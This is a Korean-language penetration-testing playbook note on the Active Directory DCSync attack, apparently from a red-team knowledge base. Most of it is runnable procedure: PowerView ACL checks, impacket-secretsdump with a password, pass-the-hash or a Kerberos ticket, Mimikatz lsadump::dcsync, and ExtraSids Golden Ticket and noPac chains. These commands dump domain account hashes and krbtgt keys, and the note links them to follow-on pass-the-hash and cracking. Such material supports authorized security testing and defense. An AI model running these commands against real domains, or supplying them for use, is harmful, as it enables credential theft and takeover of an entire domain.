---
tags:
  - 환경/ad
시작조건: ["명령 실행 위치에서 DC의 DRSUAPI RPC endpoint 접근 가능", "제어 중인 AD 계정의 비밀번호·NT hash·Kerberos key 또는 ticket 확보"]
필요권한: ["요청자의 활성 사용자·그룹 SID에 도메인 naming context의 DS-Replication-Get-Changes와 DS-Replication-Get-Changes-All 권한"]
필요조건: ["DC FQDN과 도메인명", "RPC Endpoint Mapper TCP/135와 할당된 DRS RPC 포트 접근", "Impacket 사용 시 DC TCP/445 접근", "Kerberos 사용 시 DNS·시간·DC TCP/UDP 88 접근"]
결과: ["지정한 대상 도메인 계정의 NTLM hash와 Kerberos key", "범위를 넓힌 경우 여러 도메인 계정의 NTLM hash·Kerberos key·비밀번호 이력"]
---

# DCSync

## 한 줄 판단

제어 중인 AD 계정의 인증 수단과 실제 디렉터리 복제 권한이 있고 현재 명령 실행 위치에서 DC의 Directory Replication Service Remote Protocol(DRSUAPI)에 연결할 수 있다면, 특정 대상 계정의 NT hash·Kerberos key와 비밀번호 이력을 요청한다.

## 사용할 때

- 현재 보유 인증 수단: 제어 중인 요청자 AD 계정의 평문 비밀번호, NT hash, Kerberos key 또는 유효한 ticket 중 도구가 사용할 수 있는 값.
- 명령 실행 위치: DC의 RPC Endpoint Mapper TCP/135와 DRS 동적 RPC 포트에 접근할 수 있는 호스트. Impacket `secretsdump` 경로는 초기 SMB 연결을 위해 DC TCP/445도 필요하다.
- 현재 권한: 요청자 계정의 활성 사용자·그룹 SID 집합에 필요한 두 복제 확장 권한이 실제로 적용된 상태. 두 allow 권한은 서로 다른 적용 SID에 있을 수 있으며, 적용 deny ACE가 없어야 한다. 단순 인증 성공이나 관리자 표시는 충분하지 않다.
- 공격 대상과 결과: 요청자와 별개로 지정한 사용자, `krbtgt` 또는 제한한 도메인 범위의 NTLM hash와 Kerberos key를 얻는다. 요청자 세션이 자동으로 관리자 세션으로 바뀌지는 않는다.
- 수집 결과 경계: DRSUAPI 출력은 디렉터리에 저장된 NTLM hash·Kerberos key·비밀번호 이력이며, 평문 비밀번호 복구나 대상 서비스 로그인 성공은 별도 검증 단계다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 명령 실행 위치와 RPC 경로 | DC TCP/135와 할당된 DRS 동적 RPC 포트에 접근 가능. Impacket 사용 시 TCP/445도 필요 | `Test-NetConnection <DC_IP> -Port 135`, Impacket이면 `Test-NetConnection <DC_IP> -Port 445`, RPC endpoint 확인 | 방화벽, 피벗 경로와 환경의 고정 또는 동적 RPC 범위 확인 |
| 요청자 인증 수단 | 제어 중인 AD 계정의 비밀번호·NT hash·Kerberos key 또는 ticket 중 하나 | 선택한 `secretsdump`/Mimikatz 방식으로 인증 가능한 형식 확인 | 인증 수단 형식, 도메인·계정명과 ticket 환경 확인 |
| 요청자 복제 권한 | 요청자의 활성 사용자·그룹 SID 집합에 `DS-Replication-Get-Changes`와 `DS-Replication-Get-Changes-All` 적용 | [[AD 계정의 디렉터리 복제 권한 확인]]에서 사용자·유효 그룹 SID 기준 ACL 확인 | 그룹 중첩, token SID 상태, deny ACE와 도메인 naming context 범위 재확인 |
| 공격 대상 계정 | `sAMAccountName` 또는 UPN으로 특정한 별도 도메인 계정 | 최소 범위의 `-just-dc-user` 요청 | 계정명과 대상 도메인 재확인 |
| Kerberos 경로 | ticket 사용 시 DC FQDN, DNS, 시간과 TCP/UDP 88 정상 | `klist`, 이름 해석과 KDC 오류 확인 | realm, `KRB5CCNAME`, DNS와 시간 동기화 확인 |

### 요청자와 대상 계정 구분

| 역할 | 필요한 상태 | 성공 시 확인하는 결과 |
|---|---|---|
| 복제 요청자 | 유효한 인증 수단과 두 복제 확장 권한을 가진 제어 중인 AD Identity | DRSUAPI 요청 권한. 이 계정의 비밀번호를 수집하는 것이 목적일 필요는 없음 |
| 복제 대상 계정 | 요청에서 지정한 사용자, 서비스 계정 또는 `krbtgt` | 해당 대상에 대해 AD에 저장된 NTLM hash와 Kerberos key |

## 실행

1. [[AD 계정의 디렉터리 복제 권한 확인]]에서 Domain Admin 멤버십과 실제 DCSync 권한을 구분한다.
2. 특정 사용자부터 최소 범위로 dump한다.
3. 필요 시 krbtgt 또는 전체 도메인 hash를 수집한다.
4. 확보 hash는 PtH/cracking/영향도 산정으로 연결한다.

### Windows 공격 호스트에서 복제 권한 확인

전체 판정 기준과 PowerView 함수명 차이는 [[AD 계정의 디렉터리 복제 권한 확인]]에서 확인한다. DCSync 실행 직전에는 요청자로 사용할 계정의 사용자 SID와 유효 그룹 SID 집합에서 두 필수 권한과 적용 deny를 다시 맞춘다.

```powershell
Import-Module .\PowerView.ps1
$requester = '<DOMAIN>\<REQUESTER>'
$userSid = Convert-NameToSid $requester
$groupSids = Get-DomainGroup -MemberIdentity $requester |
  Select-Object -ExpandProperty objectsid
$effectiveSids = @($userSid) + @($groupSids) |
  Where-Object { $_ } |
  Sort-Object -Unique
Get-DomainObjectACL -ResolveGUIDs -Identity '<DOMAIN_DN>' |
  Where-Object {
    $_.SecurityIdentifier -in $effectiveSids -and
    $_.ObjectAceType -match '^DS-Replication-Get-Changes'
  } |
  Select-Object AceQualifier,SecurityIdentifier,ObjectAceType,ActiveDirectoryRights
```

확인할 출력:

- 요청자의 사용자·유효 그룹 `SecurityIdentifier` 집합에 `DS-Replication-Get-Changes`와 `DS-Replication-Get-Changes-All`이 `AccessAllowed`로 표시된다.
- 두 권한이 서로 다른 적용 SID에 있어도 현재 요청자에게 모두 적용될 수 있다. 반대로 다른 SID의 ACE, disabled·deny-only 그룹과 적용되는 deny ACE는 허용 권한으로 계산하지 않는다.
- ACL 목록은 실행 후보를 확인하는 단계다. 실제 DRSUAPI 요청과 대상 계정 자료 출력 전에는 성공으로 판정하지 않는다.

### Linux 공격 호스트에서 Impacket DCSync

세 방식은 **복제 요청자 `<REQUESTER>`를 DC에 인증하는 수단만 다르다.** 어느 방식을 사용하든 `<REQUESTER>`의 활성 사용자·그룹 SID에는 도메인 naming context에 대한 `DS-Replication-Get-Changes`와 `DS-Replication-Get-Changes-All` 권한이 적용되어야 한다. `-just-dc-user <TARGET_USER>`는 인증에 사용할 계정이 아니라 NTLM hash·Kerberos key를 가져올 별도 대상 계정이다.

| 보유한 요청자 인증 수단 | 사용할 방식 | 추가로 확인할 조건 | 핵심 옵션 |
|---|---|---|---|
| `<REQUESTER>`의 평문 비밀번호 | 비밀번호 인증 | 명령 실행 호스트에서 DC RPC 경로에 접근 가능 | `<REQUESTER>:<PASSWORD>` |
| `<REQUESTER>`의 NT hash | NTLM Pass-the-Hash | 대상 DC가 NTLM 인증을 허용하고 hash가 현재 요청자 계정과 일치 | `-hashes <LM_HASH>:<NT_HASH>` |
| `<REQUESTER>`의 유효한 Kerberos TGT 또는 필요한 service ticket이 담긴 ccache | Kerberos ticket 인증 | `KRB5CCNAME`, DC FQDN·DNS·realm·시간과 필요 시 TCP/UDP 88 정상 | `-k -no-pass` |

#### 1. 평문 비밀번호로 요청자 인증

```bash
impacket-secretsdump -dc-ip <DC_IP> -just-dc-user <TARGET_USER> '<DOMAIN>/<REQUESTER>:<PASSWORD>@<DC_FQDN>'
```

- `<PASSWORD>`는 복제 권한을 가진 `<REQUESTER>` 계정의 비밀번호다.
- 비밀번호 인증 성공은 DCSync 권한을 의미하지 않는다. 이어지는 DRSUAPI 요청과 대상 계정 출력까지 확인한다.

#### 2. NT hash로 Pass-the-Hash 인증

```bash
impacket-secretsdump -hashes :<NT_HASH> -just-dc-user <TARGET_USER> '<DOMAIN>/<REQUESTER>@<DC_IP>'
```

- `<NT_HASH>`는 `<TARGET_USER>`가 아니라 복제 요청자인 `<REQUESTER>`의 NT hash다.
- LM hash를 보유하지 않았다면 `:<NT_HASH>`를 사용한다. 전체 형식이 필요한 환경에서는 빈 LM hash인 `aad3b435b51404eeaad3b435b51404ee:<NT_HASH>`를 사용할 수 있다.
- 이 방식은 평문 비밀번호를 복구하지 않고 NT hash로 NTLM challenge-response를 계산하는 [[Pass the Hash]] 인증이다.

#### 3. Kerberos ccache로 ticket 인증

```bash
export KRB5CCNAME=<CCACHE_FILE>
klist
impacket-secretsdump -k -no-pass -dc-ip <DC_IP> -just-dc-user <TARGET_USER> '<DOMAIN>/<REQUESTER>@<DC_FQDN>'
```

- `<REQUESTER>`는 ccache에 표시된 복제 요청자 principal과 일치해야 한다.
- `-k`는 Kerberos를 사용하고 `-no-pass`는 비밀번호 입력을 생략한다. 익명 인증이 아니라 `KRB5CCNAME`의 ticket으로 인증하는 방식이다.
- ccache에 유효한 TGT가 있으면 필요한 service ticket을 요청할 수 있다. 특정 SPN의 TGS만 있다면 그 ticket이 DCSync 통신에 필요한 서비스와 일치하는지 별도로 확인한다.

확인할 출력:

- `Using the DRSUAPI method`, 대상 사용자 NTLM hash.
- `-outputfile <PREFIX>`를 사용했다면 `.ntds`, `.ntds.kerberos`, `.ntds.cleartext` 등 실제 생성 파일을 확인한다.
- `STATUS_LOGON_FAILURE`는 평문 비밀번호·NT hash·도메인·요청자 계정 형식부터 확인한다.
- KDC·ccache 오류는 `KRB5CCNAME`, ticket 만료, DC FQDN·realm·DNS와 시간 정합성을 확인한다.
- `STATUS_ACCESS_DENIED` 또는 `rpc_s_access_denied`는 인증 수단이 틀렸다는 뜻으로 단정하지 말고, 먼저 현재 요청자의 사용자·유효 그룹 SID에 적용되는 복제 권한과 RPC 경로를 분리 확인한다.
- `ERROR_DS_NAME_ERROR_NOT_UNIQUE`는 `<TARGET_USER>`가 하나로 해석되지 않은 상태다. `-just-dc-user '<NETBIOS_DOMAIN>/<TARGET_USER>'`처럼 대상 계정을 도메인까지 포함해 지정한다.

### Windows 공격 호스트에서 Mimikatz DCSync

현재 Windows 세션이 복제 요청자 계정이 아니고 요청자의 평문 비밀번호를 사용할 때는 별도 네트워크 인증 프로세스를 만든다. `/netonly`는 로컬 로그온 Identity를 바꾸지 않고 원격 접근에 지정한 자격 증명을 사용하므로, 새 창에서 `whoami`가 원래 로컬 계정으로 보여도 DCSync 요청자와 혼동하지 않는다.

```cmd
runas /netonly /user:<DOMAIN>\<REQUESTER> cmd.exe
```

새 창에서 Mimikatz를 실행한다. DCSync는 원격 디렉터리 복제 요청이므로 이 동작 자체를 위해 `privilege::debug`나 로컬 SYSTEM 권한을 전제로 삼지 않는다. 현재 네트워크 인증 주체의 복제 권한과 DC RPC 경로가 핵심 조건이다.

```cmd
mimikatz.exe
lsadump::dcsync /domain:<DOMAIN_FQDN> /user:<DOMAIN_NETBIOS>\<TARGET_USER>
```

확인할 출력:

- `Hash NTLM`, `Object RDN`, `SAM Username`.
- `[DC]`에 표시된 도메인·DC와 요청한 대상 계정이 의도한 값과 일치해야 한다.

### 민감 출력 파일을 만들 때

화면 출력만 사용하면 로컬 결과 파일은 생기지 않는다. `-outputfile`이 필요하면 기존 파일과 섞이지 않는 전용 디렉터리·접두부를 먼저 만들고 이번 실행에서 생성된 경로를 기록한다.

```bash
test ! -e '<OUTPUT_DIRECTORY>'
mkdir -m 700 '<OUTPUT_DIRECTORY>'
test ! -e '<OUTPUT_DIRECTORY>/<OUTPUT_PREFIX>.ntds'
impacket-secretsdump -outputfile '<OUTPUT_DIRECTORY>/<OUTPUT_PREFIX>' -dc-ip <DC_IP> -just-dc-user <TARGET_USER> '<DOMAIN>/<REQUESTER>@<DC_FQDN>'
find '<OUTPUT_DIRECTORY>' -maxdepth 1 -type f -name '<OUTPUT_PREFIX>.*' -print
```

- `-outputfile`은 base 이름이며 모드와 반환 자료에 따라 `.ntds`, `.ntds.kerberos`, `.ntds.cleartext` 같은 접미 파일이 생길 수 있다. 예상 이름만 가정하지 말고 `find`가 반환한 exact 경로를 이번 실행의 정리 목록으로 기록한다.
- 이 파일들은 hash·Kerberos key·복호화 가능한 값이 들어갈 수 있는 민감 산출물이다. 실제 credential이나 작업 로그를 Vault에 저장하지 않는다.

### 자식 도메인 ExtraSids Golden Ticket으로 부모 계정 DCSync

먼저 [[자식 도메인 ExtraSids Golden Ticket]]에서 ccache 생성, 자식·부모 KDC 처리와 부모 서비스 접근을 확인한다. `<CHILD_USER>`는 Kerberos 복제 요청자이고 `<TARGET_USER>`는 부모 도메인에서 자격 증명을 추출할 별도 대상 계정이다.

```bash
export KRB5CCNAME="$PWD/<CHILD_USER>.ccache"
impacket-secretsdump -debug -k -no-pass -target-ip <ROOT_DC_IP> -just-dc-user '<ROOT_NETBIOS>/<TARGET_USER>' '<CHILD_FQDN>/<CHILD_USER>@<ROOT_DC_FQDN>'
```

확인할 출력:

- debug 출력이 자식 KDC에서 부모 KDC로 이어진다.
- `Using the DRSUAPI method` 뒤에 부모 `<TARGET_USER>`의 NT hash와 Kerberos key가 출력된다.
- `-target-ip`는 부모 DC IP로 연결하면서 Kerberos 서비스 이름은 `<ROOT_DC_FQDN>`으로 유지한다.
- 구버전 Impacket에서 `-dc-ip <ROOT_DC_IP>`로 KDC를 부모 DC에 고정하면 첫 자식 realm 요청이 잘못 전달되어 `KDC_ERR_WRONG_REALM`이 발생할 수 있다. 양쪽 도메인이 정상 해석되면 이 경로에서는 `-dc-ip`를 생략한다.

Windows에서 ExtraSids ticket을 주입한 경우:

```text
mimikatz # lsadump::dcsync /domain:<ROOT_FQDN> /user:<ROOT_NETBIOS>\<TARGET_USER>
```

확인할 출력:

- `[DC] '<ROOT_FQDN>'`, 요청한 부모 계정과 `Hash NTLM`.
- 여러 도메인이 있는 상태에서는 `/domain:<ROOT_FQDN>`으로 복제 대상을 명확히 지정한다.

### NoPac으로 확보한 고권한 ticket에서 DCSync

NoPac의 컴퓨터 객체 생성·이름 복구 결과를 확인한 뒤 복제 대상 한 계정만 지정한다.

```bash
sudo python3 noPac.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -dc-host <DC_HOST> --impersonate <IMPERSONATE_USER> -use-ldap -dump -just-dc-user '<DOMAIN>/<TARGET_USER>'
```

확인할 출력:

- `Using the DRSUAPI method to get NTDS.DIT secrets`.
- `<TARGET_USER>`의 NT hash와 Kerberos key. `<USER>`는 NoPac 실행 요청자이고 `<TARGET_USER>`는 복제 대상이다.
- `rpc_s_access_denied`는 SYSTEM 셸 획득 여부와 별개로 현재 Kerberos 실행 주체의 복제 권한 또는 가장 성공 여부를 확인한다.
- `KDC_ERR_*`, `STATUS_LOGON_FAILURE` 또는 컴퓨터 객체 생성 오류가 먼저 나오면 DCSync 결과보다 NoPac 인증·객체 변경 단계를 먼저 해결한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| `Using the DRSUAPI method`와 대상 사용자 NTLM hash | 복제 API 호출과 대상 계정 추출 성공 | 특정 도메인 계정 hash 확보 | 최소 범위를 유지해 후속 사용 가능성 검토 |
| `krbtgt` 또는 고권한 계정의 NTLM hash·Kerberos key 출력 | 도메인 핵심 계정의 hash·key 노출 | 도메인 전체 영향 가능 상태 | 계정과 key 종류에 맞춰 [[Pass the Hash]], [[OverPass the Hash]], [[Pass the Ticket]] 가능성을 분리 |
| `rpc access denied` | 현재 Identity에 복제 권한 없음 | 인증은 가능하나 DCSync 불가 | ACL, 그룹, DC 머신 계정 권한 재확인 |
| KDC 또는 DNS 오류 | Kerberos 경로 설정 문제 | 권한 판정 전 연결 실패 | FQDN, realm, `KRB5CCNAME`, 시간 동기화 확인 |
| 특정 사용자만 실패 | 계정명 또는 도메인 지정 불일치 | 다른 복제 요청 결과는 유지 | sAMAccountName, UPN, DC 지정 재확인 |
| ExtraSids 경로에서 `KDC_ERR_WRONG_REALM` | cross-realm referral 요청이 잘못된 KDC로 전달됨 | DRSUAPI 실행 전 Kerberos 실패 | 양쪽 도메인 DNS를 구성하고 부모 KDC 고정 옵션 제거 검토 |

## 변경 영향과 복구

DCSync의 DRSUAPI 요청은 AD 객체 값을 바꾸지 않으므로 복원할 디렉터리 값은 없다. 그러나 요청·인증 감사 흔적은 되돌릴 수 없고, `-outputfile`을 사용하면 공격 호스트에 민감 파일이 남는다.

승인된 증적으로 보존하지 않는 경우, 위에서 기록한 이번 실행의 exact 파일만 제거한 뒤 전용 디렉터리가 비었을 때 삭제한다.

```bash
rm -- '<OUTPUT_DIRECTORY>/<RECORDED_OUTPUT_FILE_1>' '<OUTPUT_DIRECTORY>/<RECORDED_OUTPUT_FILE_2>'
find '<OUTPUT_DIRECTORY>' -maxdepth 1 -type f -print
rmdir -- '<OUTPUT_DIRECTORY>'
test ! -e '<OUTPUT_DIRECTORY>'
```

- 생성 파일 수가 다르면 실제 기록한 목록에 맞춰 `rm --` 인수를 조정한다. 접두부 wildcard나 다른 작업의 출력까지 일괄 삭제하지 않는다.
- `find`에 파일이 남으면 소유자·보존 필요성을 확인하며, 남은 파일이 있는데 디렉터리 삭제를 완료로 기록하지 않는다.
- 증적으로 보존하면 삭제 대신 Vault 밖의 승인된 위치·담당자·보존 기한을 기록한다. DCSync 성공과 산출물 처분 완료를 별도로 판정한다.
- 인증·복제 요청과 DC 감사 기록은 클라이언트 정리로 제거되지 않는다. 이를 원상복구했다고 표현하지 않는다.

## 확인할 출력과 권한

- `Using the DRSUAPI method`와 실제 계정 hash가 함께 있어야 DCSync 성공으로 판정한다.
- Domain Admin 멤버십과 복제 권한은 같은 개념이 아니다. 위임된 복제 권한이 있으면 비관리자도 가능하며, 인증 성공만으로는 부족하다.
- DC 머신 계정도 실제 복제 요청 성공 여부로 권한을 확인한다.
- 요청자 인증 성공, DRSUAPI 바인딩, 대상 credential 출력과 이후 서비스 인증·관리자 권한은 각각 별도 단계다.

## 참고 링크

- [Microsoft: IDL_DRSGetNCChanges](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/b63730ac-614c-431c-9501-28d6aca91894)
- [Microsoft: DS-Replication-Get-Changes extended right](https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes)
- [Microsoft: DS-Replication-Get-Changes-All extended right](https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes-all)
- [Microsoft: Runas](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11))
- [Fortra Impacket: secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
- [gentilkiwi Mimikatz: lsadump module](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump)
- [SpecterOps BloodHound: DCSync edge](https://bloodhound.specterops.io/resources/edges/dc-sync)

## 후속 공격 연결

- [[Pass the Hash]]
- [[OverPass the Hash]]
- [[Pass the Ticket]]
- [[오프라인 해시 크래킹]]

## 관련 상태 라우터

- 획득한 도메인 hash의 서비스별 사용 가능성을 검증할 때: [[확보한 자격 증명으로 원격 접근 경로 선택]]
- hash가 속한 도메인 계정을 확인한 뒤 객체·그룹 권한을 열거할 때: [[AD Identity 확인 후 도메인 컨텍스트 열거]]

## 관련 공격기법

- [[AD 계정의 디렉터리 복제 권한 확인]]

## 관련 도구

- [[impacket-secretsdump]]
- [[mimikatz]]
- [[klist]]
- [[noPac]]
